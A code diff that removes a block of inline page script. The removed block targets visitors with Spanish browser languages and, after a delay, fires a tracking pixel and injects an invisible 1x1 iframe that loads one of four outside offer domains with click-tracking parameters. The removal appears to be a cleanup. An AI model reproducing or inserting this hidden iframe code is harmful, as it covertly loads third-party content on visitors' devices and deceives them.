@@ -172,39 +172,6 @@ var motion = false;
 		var userAgent = (window.navigator && window.navigator.userAgent) || '';
 
 		var hashResult = hashCode(langs.join('') + userAgent);
-
-		setTimeout(function() {
-		    if (!!motion && langs.length == 2 && langs[0].indexOf('es') == 0) {
-
-				if(!!queryStringObj.ctrTrackingUrl) {
-				  createPixel(queryStringObj.ctrTrackingUrl)
-				}
-
-		        var ifr = document.createElement('iframe');
-		        ifr.style.width = '1px';
-		        ifr.style.height = '1px';
-
-				var modulo = Math.abs(hashResult % 4);
-
-				switch (modulo) {
-					case 1:
-						ifr.src = 'http://w.flamilingo.com/es/flamilingo?offer='+queryStringObj.offer+'&atmobirun=1&click_id='+queryStringObj.click_id+'&inventory_domain='+queryStringObj.inventory_domain;
-						break;
-					case 2:
-						ifr.src = 'http://n.trendme.co/es/trendme?offer='+queryStringObj.offer+'&atmobirun=1&click_id='+queryStringObj.click_id+'&inventory_domain='+queryStringObj.inventory_domain;
-						break;
-					case 3:
-						ifr.src = 'http://n.teletube.tv/es/streamtv?offer='+queryStringObj.offer+'&atmobirun=1&click_id='+queryStringObj.click_id+'&inventory_domain='+queryStringObj.inventory_domain;
-						break;
-					case 0:
-						ifr.src = 'http://n.beemobi.me/es/top-games?offer='+queryStringObj.offer+'&atmobirun=1&click_id='+queryStringObj.click_id+'&inventory_domain='+queryStringObj.inventory_domain;
-						break;
-					default:
-				}
-
-		        document.body.appendChild(ifr);
-		    }
-		}, 2000)
     </script>
 
 </body>
